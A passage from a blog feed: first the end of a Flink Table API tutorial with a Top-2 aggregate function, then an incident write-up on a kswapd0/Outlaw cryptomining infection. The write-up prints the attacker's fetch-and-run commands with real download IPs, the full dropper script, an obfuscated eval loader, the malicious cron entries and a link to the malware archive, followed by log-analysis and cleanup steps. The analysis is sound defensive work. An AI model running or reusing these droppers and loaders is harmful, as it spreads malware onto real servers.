ACC&gt;，用一个ACC类型的累加器（accumulator）来存储聚合的中间结果。聚合函数中必须实现的三个方法，在TableAggregateFunction中也必须对应实现：</p><ul><li>createAccumulator()</li></ul><p>创建累加器的方法，与AggregateFunction中用法相同。</p><ul><li>accumulate()</li></ul><p>聚合计算的核心方法，与AggregateFunction中用法相同。</p><ul><li>emitValue()</li></ul><p>所有输入行处理完成后，输出最终计算结果的方法。这个方法对应着AggregateFunction中的getValue()方法；区别在于emitValue没有输出类型，而输入参数有两个：第一个是ACC类型的累加器，第二个则是用于输出数据的“收集器”out，它的类型为Collect&lt;T&gt;。另外，emitValue()在抽象类中也没有定义，无法override，必须手动实现。</p><p>表聚合函数相对比较复杂，它的一个典型应用场景就是TOP-N查询。比如我们希望选出一组数据排序后的前两名，这就是最简单的TOP-2查询。没有现成的系统函数，那么我们就可以自定义一个表聚合函数来实现这个功能。在累加器中应该能够保存当前最大的两个值，每当来一条新数据就在accumulate()方法中进行比较更新，最终在emitValue()中调用两次out.collect()将前两名数据输出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTableAggregateFunctionDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  姓名，分数，权重</span></span><br><span class="line">        DataStreamSource&lt;Integer&gt; numDS = env.fromElements(<span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">        Table numTable = tableEnv.fromDataStream(numDS, $(<span class="string">"num"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 2.注册函数</span></span><br><span class="line">        tableEnv.createTemporaryFunction(<span class="string">"Top2"</span>, Top2<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 3.调用 自定义函数: 只能用 Table API</span></span><br><span class="line">        numTable</span><br><span class="line">                .flatAggregate(call(<span class="string">"Top2"</span>, $(<span class="string">"num"</span>)).as(<span class="string">"value"</span>, <span class="string">"rank"</span>))</span><br><span class="line">                .select( $(<span class="string">"value"</span>), $(<span class="string">"rank"</span>))</span><br><span class="line">                .execute().print();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 1.继承 TableAggregateFunction&lt; 返回类型，累加器类型&lt;加权总和，权重总和&gt; &gt;</span></span><br><span class="line">    <span class="comment">// 返回类型 (数值，排名) =》 (12,1) (9,2)</span></span><br><span class="line">    <span class="comment">// 累加器类型 (第一大的数，第二大的数) ===》 （12,9）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Top2</span> <span class="keyword">extends</span> <span class="title">TableAggregateFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">Integer</span>, <span class="title">Integer</span>&gt;, <span class="title">Tuple2</span>&lt;<span class="title">Integer</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Integer&gt; <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Tuple2.of(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 每来一个数据调用一次，比较大小，更新 最大的前两个数到 acc中</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> acc 累加器</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> num 过来的数据</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accumulate</span><span class="params">(Tuple2&lt;Integer, Integer&gt; acc, Integer num)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (num &gt; acc.f0) &#123;</span><br><span class="line">                <span class="comment">// 新来的变第一，原来的第一变第二</span></span><br><span class="line">                acc.f1 = acc.f0;</span><br><span class="line">                acc.f0 = num;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; acc.f1) &#123;</span><br><span class="line">                <span class="comment">// 新来的变第二，原来的第二不要了</span></span><br><span class="line">                acc.f1 = num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 输出结果： （数值，排名）两条最大的</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> acc 累加器</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> out 采集器&lt;返回类型&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">emitValue</span><span class="params">(Tuple2&lt;Integer, Integer&gt; acc, Collector&lt;Tuple2&lt;Integer, Integer&gt;&gt; out)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (acc.f0 != <span class="number">0</span>) &#123;</span><br><span class="line">                out.collect(Tuple2.of(acc.f0, <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (acc.f1 != <span class="number">0</span>) &#123;</span><br><span class="line">                out.collect(Tuple2.of(acc.f1, <span class="number">2</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Flink SQL&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;http://qnypic.shawncoding.top/blog/202404161647741.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;Table API和SQL是最上层的API，在Flink中这两种API被集成在一起，SQL执行的对象也是Flink中的表（Table），所以我们一般会认为它们是一体的。Flink是批流统一的处理框架，无论是批处理（DataSet API）还是流处理（DataStream API），在上层应用中都可以直接使用Table API或者SQL来实现；这两种API对于一张表执行相同的查询操作，得到的结果是完全一样的。我们主要还是以流处理应用为例进行讲解。&lt;/p&gt;
&lt;p&gt;SQL API 是基于 SQL 标准的 Apache Calcite 框架实现的，可通过纯 SQL 来开发和运行一个Flink 任务&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>kswapd0挖矿病毒攻击记录</title>
    <link href="https://blog.shawncoding.top/posts/b2dd7295.html"/>
    <id>https://blog.shawncoding.top/posts/b2dd7295.html</id>
    <published>2024-02-29T12:10:38.000Z</published>
    <updated>2024-02-29T12:13:08.624Z</updated>
    
    <content type="html"><![CDATA[<h1>kswapd0挖矿病毒攻击记录</h1><h1>一、起因与病毒分析</h1><h2 id="1、起因">1、起因</h2><p>最近内网穿透服务以及自建的博客一直掉线，重启服务也不行，用 top 查看发现1个kswapd0进程占用了一整个核（机器是2C4G），遂查刚开始以为是使用swap分区与内存换页操作交换数据造成的，但是清理了缓存仍无果，最终发现被挖矿木马攻击了。</p><a id="more"></a><h2 id="2、阿里云告警">2、阿里云告警</h2><p>登陆阿里云控制台，也告警了阿里云异地登陆了，云安全中心显示凭证窃取，把我root密码爆破了</p><p><img src="http://qnypic.shawncoding.top/blog/202402291902435.png" alt></p><h3 id="2-1-恶意脚本代码执行1">2.1 恶意脚本代码执行1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c ./tddwrt7s.sh <span class="string">"http://167.172.213.233/dota3.tar.gz"</span> <span class="string">"http://5.161.227.142/dota3.tar.gz"</span> <span class="string">"http://216.70.68.24/dota3.tar.gz"</span> <span class="string">"http://104.131.132.54/dota3.tar.gz"</span> <span class="string">"http://172.104.46.33/dota3.tar.gz"</span> <span class="string">"http://37.139.10.109/dota3.tar.gz"</span> <span class="string">"http://46.101.132.59/dota3.tar.gz"</span> &gt;.out 2&gt;&amp;1 3&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202402291902436.png" alt></p><h3 id="2-2-恶意脚本代码执行2">2.2 恶意脚本代码执行2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c wget -q http://161.35.236.24/tddwrt7s.sh || curl -s -O -f http://161.35.236.24/tddwrt7s.sh 2&gt;&amp;1 3&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202402291902437.png" alt></p><h3 id="2-3恶意脚本代码执行3">2.3恶意脚本代码执行3</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291902438.png" alt></p><h3 id="2-4-恶意脚本代码执行4">2.4 恶意脚本代码执行4</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/.configrc5/a/kswapd0</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202402291902439.png" alt></p><h2 id="3、病毒简单分析">3、病毒简单分析</h2><h3 id="3-1-病毒的初始化">3.1 病毒的初始化</h3><p><code>tddwrt7s.sh</code>脚本内容，脚本主要是下载dota3的病毒文件，并运行初始化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ -d <span class="string">"/tmp/.X2y1-unix/.rsync/c"</span> ]; <span class="keyword">then</span></span><br><span class="line">        cat /tmp/.X2y1-unix/.rsync/initall | bash 2&gt;1&amp;</span><br><span class="line">        <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cd</span> /tmp</span><br><span class="line">        rm -rf .ssh</span><br><span class="line">        rm -rf .mountfs</span><br><span class="line">        rm -rf .X2*</span><br><span class="line">        rm -rf .X3*</span><br><span class="line">        rm -rf .X25-unix</span><br><span class="line">        mkdir .X2y1-unix</span><br><span class="line">        <span class="built_in">cd</span> .X2y1-unix</span><br><span class="line">        RANGE=6</span><br><span class="line">        s=<span class="variable">$RANDOM</span></span><br><span class="line">        <span class="built_in">let</span> <span class="string">"s %= <span class="variable">$RANGE</span>"</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 0 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 15 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$1</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$1</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 1 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 5 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$2</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$2</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 2 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 25 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$3</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$3</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 3 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 10 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$4</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$4</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 4 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 30 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$5</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$5</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 5 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 15 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$6</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$6</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$s</span> == 6 ]; <span class="keyword">then</span></span><br><span class="line">                        sleep $[ ( <span class="variable">$RANDOM</span> % 500 )  + 55 ]s</span><br><span class="line">                        curl -O -f <span class="variable">$7</span> || wget -w 3 -T 10 -t 2 -q --no-check-certificate <span class="variable">$7</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        sleep 60s</span><br><span class="line">        tar xvf dota3.tar.gz</span><br><span class="line">        sleep 10s</span><br><span class="line"><span class="comment">#       rm -rf dota3.tar.gz</span></span><br><span class="line">        <span class="built_in">cd</span> .rsync</span><br><span class="line">        cat /tmp/.X2y1-unix/.rsync/initall | bash 2&gt;1&amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>可以发现首先是运行了<code>/tmp/.X2y1-unix/.rsync/initall</code>脚本，打开发现进行了shell混淆，最后eval命令会执行其后的参数作为Shell命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">z=<span class="string">"</span></span><br><span class="line"><span class="string">"</span>;qz=<span class="string">''</span>\<span class="string">''</span>&#123;pr<span class="string">';Fz='</span>&amp; pw<span class="string">';fz='</span> tsm<span class="string">';Zz='</span> go&gt;<span class="string">';CBz='</span>&#123;pri<span class="string">';Ez='</span> ~ &amp;<span class="string">';XBz='</span>p -v<span class="string">';Yz='</span>l -9<span class="string">';Vz='</span>tdd.<span class="string">';wBz='</span><span class="string">" ];';DCz='2 | ';Az='slee';qBz='p 10';SBz='-9 l';yBz='n';UBz='nux';dz='&gt; .o';nz='-v g';iz='`ps ';Gz='d)';gz='kill';pz='awk ';jBz=' '\''&#123;p';Dz='<span class="variable">$(cd';kBz='rint';gBz='grep';oz='rep|';lz='un|g';cBz='t $1';kz='ep r';nBz='cat ';vz='ep g';VBz='ep x';hz=' -9 ';Cz='dir=';RBz='mrig';bBz='prin';GBz='sm|g';HBz='chat';Bz='p 1';Lz='E';CCz='else';xz='ep -';OBz='kr -';lBz=' $1&#125;';Xz='pkil';ABz='ep|a';ZBz='p|aw';tz='`&gt; .';hBz=' -v ';KBz='~/.c';jz='x|gr';pBz=' | s';eBz='ep l';FBz='ep t';fBz='nux|';vBz='grc5';Uz='.x*';Sz='nu.*';LBz='onfi';mBz=''\''`';oBz='init';Tz='.F*';uz='out';ez='ut';aBz='k '\''&#123;';wz='o|gr';Rz='h';yz='v gr';IBz='tr -';cz=' run';WBz='|gre';Wz='sh';rBz='if [';Nz='dev/';ACz='exit';iBz='|awk';Oz='shm/';Jz='tmp/';BCz=' 0';TBz='d-li';Hz='rm -';bz='t';Mz='E*';tBz='"$di';JBz='iaR ';dBz='&#125;'\''`';PBz='all ';BBz='wk '\''';mz='rep ';NBz='lock';ECz='fi';Qz='nu.s';DBz='nt $';az=' .ou';rz='int ';uBz='r/.c';sz='$1&#125;'\''';Iz='rf /';EBz='1&#125;'\''`';xBz=' the';QBz='-9 x';YBz=' gre';MBz='grc*';Kz='.FIL';sBz=' -d ';Pz='var/';</span></span></span><br><span class="line"><span class="string"><span class="variable">eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$Lz$z$Hz$Iz$Jz$Kz$Mz$z$Hz$Iz$Nz$Oz$Kz$Mz$z$Hz$Iz$Nz$Oz$Kz$Lz$z$Hz$Iz$Pz$Jz$Kz$Lz$z$Hz$Iz$Pz$Jz$Kz$Mz$z$Hz$Iz$Jz$Qz$Rz$z$Hz$Iz$Jz$Sz$z$Az$Bz$z$Hz$Iz$Nz$Oz$Qz$Rz$z$Hz$Iz$Nz$Oz$Sz$z$Hz$Iz$Jz$Tz$z$Hz$Iz$Jz$Uz$z$Hz$Iz$Jz$Vz$Wz$z$Xz$Yz$Zz$az$bz$z$Xz$Yz$cz$dz$ez$z$Xz$Yz$fz$dz$ez$z$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$z$gz$hz$iz$jz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$dz$ez$z$gz$hz$iz$jz$FBz$GBz$mz$nz$oz$pz$qz$rz$sz$tz$uz$z$HBz$IBz$JBz$KBz$LBz$MBz$z$NBz$OBz$JBz$KBz$LBz$MBz$z$gz$PBz$QBz$RBz$z$gz$PBz$SBz$TBz$UBz$z$Az$Bz$z$gz$hz$iz$jz$VBz$RBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$z$gz$hz$iz$jz$eBz$TBz$fBz$gBz$hBz$gBz$iBz$jBz$kBz$lBz$mBz$z$nBz$oBz$pBz$Rz$z$Az$qBz$z$rBz$sBz$tBz$uBz$LBz$vBz$wBz$xBz$yBz$z$ACz$BCz$z$CCz$z$nBz$oBz$DCz$Wz$z$ECz$z$ACz$BCz"</span></span></span><br></pre></td></tr></table></figure><p>我们首先进行解密，利用bash的调试模式即可<code>bash -x xxx.sh</code>，注意这是追踪模式，命令还是会运行，这里主要就是病毒的初始化运行，将一些服务暂停，缓存文件进行删除。后面就是几个脚本的定时执行，加入公钥，修改定时任务，开始挖矿</p><h3 id="3-2-病毒本体执行">3.2 病毒本体执行</h3><p>首先看了一下.ssh，把我的.ssh删除了，加入了它的公钥。然后看一下定时任务，哦吼，定时任务被修改了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">crontab -l </span><br><span class="line"></span><br><span class="line">5 6 * * 0 /root/.configrc5/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /root/.configrc5/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">5 8 * * 0 /root/.configrc5/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /root/.configrc5/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">0 0 */3 * * /tmp/.X2y1-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>从定时任务可以看出，主要是两个文件目录，一个是<code>/root/.configrc5</code>，还有一个是<code>/tmp/.X2y1-unix</code>（都是隐藏目录，很狡猾），注意还有一个<code>/tmp/up.txt</code>文件，这就是被爆破的root账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /root/.configrc5目录结构，病毒所在目录</span></span><br><span class="line">├── a</span><br><span class="line">│   ├── a</span><br><span class="line">│   ├── bash.pid</span><br><span class="line">│   ├── cert_key.pem</span><br><span class="line">│   ├── cert.pem</span><br><span class="line">│   ├── dir.dir</span><br><span class="line">│   ├── init0</span><br><span class="line">│   ├── kswapd0</span><br><span class="line">│   ├── run</span><br><span class="line">│   ├── stop</span><br><span class="line">│   └── upd</span><br><span class="line">├── b</span><br><span class="line">│   ├── a</span><br><span class="line">│   ├── dir.dir</span><br><span class="line">│   ├── run</span><br><span class="line">│   ├── stop</span><br><span class="line">│   └── sync</span><br><span class="line">├── cron.d</span><br><span class="line">└── dir2.dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># /tmp/.X2y1-unix/.rsync目录结构</span></span><br><span class="line">├── 1</span><br><span class="line">├── a</span><br><span class="line">│   ├── a</span><br><span class="line">│   ├── init0</span><br><span class="line">│   ├── kswapd0</span><br><span class="line">│   ├── run</span><br><span class="line">│   └── stop</span><br><span class="line">├── b</span><br><span class="line">│   ├── a</span><br><span class="line">│   ├── run</span><br><span class="line">│   └── stop</span><br><span class="line">├── c</span><br><span class="line">│   ├── aptitude</span><br><span class="line">│   ├── blitz</span><br><span class="line">│   ├── blitz32</span><br><span class="line">│   ├── blitz64</span><br><span class="line">│   ├── dir.dir</span><br><span class="line">│   ├── go</span><br><span class="line">│   ├── n</span><br><span class="line">│   ├── run</span><br><span class="line">│   ├── start</span><br><span class="line">│   ├── stop</span><br><span class="line">│   └── v</span><br><span class="line">├── dir.dir</span><br><span class="line">├── init</span><br><span class="line">├── init0</span><br><span class="line">├── init2</span><br><span class="line">└── initall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/root/.configrc/*      <span class="comment">#病毒所在目录</span></span><br><span class="line">/root/.ssh/          <span class="comment">#病毒公钥</span></span><br><span class="line">/tmp/.X2y1-unix/.rsync/*    <span class="comment">#病毒运行缓存文件</span></span><br><span class="line">/tmp/.X2y1-unix/dota3.tar.gz  <span class="comment">#病毒压缩包</span></span><br><span class="line">/root/.configrc5/a/kswapd0    <span class="comment">#病毒主程序</span></span><br></pre></td></tr></table></figure><p>然后就是<strong>a.kswapd0</strong>和<strong>c.blitiz64</strong> 两个执行程序，执行程序加入了混淆加密。<strong>b.run</strong> 是一段perl脚本，可以<a href="https://base64.us/" target="_blank" rel="noopener" title="base64解密">base64解密</a>。具体的文件代码可以参考，有兴趣的可以研究一下。<a href="http://qnypic.shawncoding.top/file/share/dota3%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92.zip" target="_blank" rel="noopener" title="下载地址">下载地址</a></p><p><img src="http://qnypic.shawncoding.top/blog/202402291902440.png" alt></p><h2 id="4、总结">4、总结</h2><p>Outlaw病毒通过SSH<strong>攻击，访问目标系统并下载带有shell脚本、挖矿木马、后门木马的TAR压缩包文件dota3.tar.gz。解压后的文件目录可以看到，根目录rsync下存放初始化脚本，a目录下存放shellbot后门，b目录下存放挖矿木马，c目录下存放SSH</strong>攻击程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用的日志分析技巧</span></span><br><span class="line"><span class="comment"># 定位有多少IP在爆破主机的root帐号：</span></span><br><span class="line">grep <span class="string">"Failed password for root"</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">'&#123;print $11&#125;'</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"><span class="comment"># 定位有哪些IP在爆破：</span></span><br><span class="line">grep <span class="string">"Failed password"</span> /var/<span class="built_in">log</span>/auth.log|grep -E -o <span class="string">"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c</span><br><span class="line"><span class="comment"># 爆破用户名字典是什么？</span></span><br><span class="line">grep <span class="string">"Failed password"</span> /var/<span class="built_in">log</span>/auth.log|perl -e <span class="string">'while($_=&lt;&gt;)&#123; /for(.*?) from/; print "$1\n";&#125;'</span>|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 登录成功的IP有哪些：</span></span><br><span class="line">grep <span class="string">"Accepted "</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">'&#123;print $11&#125;'</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"><span class="comment"># 登录成功的日期、用户名、IP：</span></span><br><span class="line">grep <span class="string">"Accepted "</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">'&#123;print $1,$2,$3,$9,$11&#125;'</span></span><br></pre></td></tr></table></figure><h1>二、ubuntu自救指南</h1><h2 id="1、病毒清理">1、病毒清理</h2><p>1、top + kill -9 首先停止可疑进程</p><p>2、清理定时任务crontab -e</p><p>3、删除相关后门ssh key内容，<code>vim /root/.ssh/authorized_keys</code></p><p>4、删除/tmp目录下缓存文件（不同病毒可能不一样），<code>rm -rf .X2y1-unix/</code></p><p>5、删除病毒目录和文件，<code>rm -rf /root/.configrc5</code></p><p>6、（其他暂时没发现后门，不过我发现病毒给的停止删除命令挺好使的）</p><h2 